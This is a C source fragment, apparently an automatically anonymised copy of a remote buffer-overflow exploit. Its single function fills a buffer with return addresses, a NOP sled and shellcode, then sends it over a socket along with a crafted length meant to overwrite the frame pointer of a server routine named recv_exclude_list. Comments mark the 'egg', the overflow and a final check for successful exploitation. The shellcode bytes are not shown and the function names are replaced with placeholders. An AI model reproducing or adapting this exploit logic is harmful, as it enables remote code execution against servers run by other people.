#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  rd ;
typedef  int /*<<< orphan*/  len ;

/* Variables and functions */
 int MAXPATHLEN ; 
 int FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (char*,char,int) ; 
 int nopcount ; 
 int /*<<< orphan*/  FUNC7 (char*,int,int,int,int) ; 
 int /*<<< orphan*/  FUNC8 () ; 
 int /*<<< orphan*/  FUNC9 (int,...) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ) ; 

void FUNC11(int len, int line,int align) {
int s,rd;
int *ptr;
char buff[MAXPATHLEN];

s = FUNC2();
FUNC4(s);

FUNC7("Trying with len=%d and line=0x%x (shellcode=0x%x) align=%d\n",len,line,line+FUNC0(len),align);

FUNC6(buff,'A',align);

/* prepare egg and send it */
for(ptr = (int*) (&buff[0]+align); (char*)ptr < ((char*)&buff[MAXPATHLEN]-3); ptr++)
*ptr =  (line+FUNC0(len));
FUNC6(buff+FUNC0(len),'\x90',nopcount);
FUNC5(buff+FUNC0(len)+nopcount,shellcode,FUNC10(shellcode));/* possible overflow ;D */

/* prepare and send length */
rd = MAXPATHLEN -1;
FUNC9(s,&rd,sizeof(rd),0);

/* send egg */
FUNC9(s,buff,rd,0);


/* send len (overwrite fp */
FUNC9(s,&len,sizeof(len),0);


/* make recv_exclude_list() exit */
rd = 0;
FUNC9(s,&rd,sizeof(rd),0);


/* recieve any data from server and close */
FUNC3(s);

FUNC1(s);

/* check if exploitation was successfull */
FUNC8();
}